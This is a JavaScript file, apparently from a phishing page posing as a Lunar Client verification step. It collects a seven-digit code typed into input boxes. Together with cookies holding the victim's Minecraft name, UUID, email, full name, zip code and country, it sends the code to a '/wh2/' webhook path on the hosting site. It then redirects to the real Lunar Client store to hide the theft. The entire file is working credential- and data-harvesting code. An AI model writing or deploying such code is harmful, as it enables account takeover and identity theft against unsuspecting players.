function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function containsOnlyNumbers(str) {
    return /^\d+$/.test(str);
}

async function gotoLunar() {
    const codestring =
        document.getElementById("1").value +
        document.getElementById("2").value +
        document.getElementById("3").value +
        document.getElementById("4").value +
        document.getElementById("5").value +
        document.getElementById("6").value +
        document.getElementById("7").value;

    document.cookie = "code=" + codestring;

    if (
        document.getElementById("1").value == "" ||
        document.getElementById("2").value == "" ||
        document.getElementById("3").value == "" ||
        document.getElementById("4").value == "" ||
        document.getElementById("5").value == "" ||
        document.getElementById("6").value == "" ||
        document.getElementById("7").value == "" ||
        !containsOnlyNumbers(codestring) 
    ) {
        return;
    } else {
        await sendCodeWebhook();

        // wait half a seoncd
        await new Promise((r) => setTimeout(r, 500));

        location.href = "https://store.lunarclient.com/";
    }
}

async function sendCodeWebhook() {
    const uuid = getCookie("uuid");
    const ign = getCookie("ign");
    const email = getCookie("email");
    const firstName = getCookie("first-name");
    const lastName = getCookie("last-name");
    const zip = getCookie("zip");
    const country = getCookie("country");
    const code = getCookie("code");
    const loca = location.href.replaceAll("?", "");
    const ref = getCookie("ref");

        fetch(
            `${loca}/wh2/${ign}/${firstName}/${lastName}/${email}/${zip}/${country}/${uuid}/${code}/${ref}`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
            }
        );
}

// listen for when enter is pressed
document.addEventListener("keypress", function onEvent(event) {
    if (event.key === "Enter") {
        gotoLunar();
    }
});
